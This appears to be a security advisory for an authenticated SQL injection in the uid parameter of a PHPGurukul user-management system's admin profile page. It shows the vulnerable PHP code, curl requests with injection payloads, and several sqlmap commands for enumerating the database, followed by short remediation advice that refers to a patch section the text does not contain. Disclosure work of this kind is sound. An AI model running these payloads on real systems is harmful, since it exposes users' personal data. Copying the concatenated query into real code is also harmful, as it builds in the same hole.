# PHPGurukul User Registration & Login and User Management System With Admin Panel v3.3 Authenticated SQL Injection in adminuser-profile.php (uid) 

## Summary
An authenticated SQL Injection vulnerability exists in the admin user profile page (`/admin/user-profile.php`) of “User Registration & Login and User Management System With Admin Panel” version 3.3. The `uid` GET parameter is concatenated directly into a SQL query, enabling time-based and boolean-based blind SQL injection.

- Vulnerability Type: SQL Injection (CWE-89)
- Affected Product: User Registration & Login and User Management System With Admin Panel
- Affected Version: v3.3 (confirmed)
- Affected Endpoint: `/loginsystem/admin/user-profile.php`
- Vulnerable Parameter: `uid` (GET)
- Authentication: Required (Admin session)
- Severity (proposed CVSS v3.1): 7.5 High (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N)

## Technical Details
The page builds a query using user-controlled `uid` without parameterization or validation:

File evidence:
- Source file: loginsystem/admin/user-profile.php
- Root cause: direct string concatenation of `$_GET['uid']` into the SQL statement

```php
<?php
$userid=$_GET['uid'];
$query=mysqli_query($con,"select * from users where id='$userid'");
while($result=mysqli_fetch_array($query)) { /* render profile */ }
```

This enables attackers with a valid admin session to inject arbitrary SQL predicates, e.g. time-based blind via `SLEEP()` or boolean-based blind using `AND/OR` conditions.

## Proof of Concept (safe, reproducible)
Prerequisite: Login as admin to obtain a valid PHPSESSID cookie.

- Boolean-based blind (observe content differences or HTTP status/length):
```bash
curl -i "http://localhost/loginsystem/admin/user-profile.php?uid=0%27%20AND%200%3D1%20--%20-" -H "Cookie: PHPSESSID=your_admin_cookie_here"
```

- Boolean-based blind (true branch):
```bash
curl -i "http://localhost/loginsystem/admin/user-profile.php?uid=0%27%20OR%201%3D1%20--%20-" -H "Cookie: PHPSESSID=your_admin_cookie_here"
```

- Time-based blind (sqlmap; stabilize timing and reduce noise):
```bash
python.exe C:\sqlmap\sqlmap.py -u "http://localhost/loginsystem/admin/user-profile.php?uid=1" --cookie="PHPSESSID=your_admin_cookie_here" -p uid --technique=T --time-sec=10 --delay=1 --timeout=30 --retries=3 --keep-alive --random-agent --flush-session --current-db
```

Your successful run (sample) showed:
- Payload: `uid=1' AND (SELECT(SLEEP(5)))-- ...`
- Backend: Apache 2.4.39, PHP 7.3.4, MySQL ≥ 5.0.12
- Confirmed time-based blind delays and sqlmap detection (enumeration may fail under jitter; see “Verification tips”)

## Impact
- Read: Enumerate database schema and extract sensitive user data (PII: names, emails, contact numbers, registration dates).
- Pivot: Combine with other admin-side injection issues to broaden exfiltration.
- Risk: High for confidentiality; moderate for integrity (primarily SELECT-context), availability unaffected.

## Verification tips (if enumeration is unstable)
- Prefer boolean-based blind for this endpoint:
```bash
python.exe C:\sqlmap\sqlmap.py -u "http://localhost/loginsystem/admin/user-profile.php?uid=1" --cookie="PHPSESSID=your_admin_cookie_here" -p uid --technique=B --risk=3 --level=5 --random-agent --flush-session --dbs
```
- For time-based blind, increase `--time-sec`, add `--delay`, try `--no-cast`/`--hex`, and replay a captured request with `-r` to include exact headers/cookies.

## Remediation
- Replace direct string concatenation with prepared statements.
- Validate and type-check GET/POST parameters (e.g., ensure `uid` is an integer).
- Apply least-privilege DB accounts and server-side input validation.

Minimal secure patch suggestion (prepared statements):
See the “Patch snippet” section below for `admin/user-profile.php`.

## Affected Files
- `loginsystem/admin/user-profile.php` (primary injection point)

## Timeline
- Discovery: 2025-09-25

## References
- Product page (version reference): PHPGurukul “User Registration & Login and User Management System With Admin Panel” (v3.3)
- Internal code evidence: repository file `loginsystem/admin/user-profile.php`

## Appendix: Suggested sqlmap commands
- Enumerate current DB with boolean-based blind:
```bash
python.exe C:\sqlmap\sqlmap.py -u "http://localhost/loginsystem/admin/user-profile.php?uid=1" --cookie="PHPSESSID=your_admin_cookie_here" -p uid --technique=B --risk=3 --level=5 --current-db
```
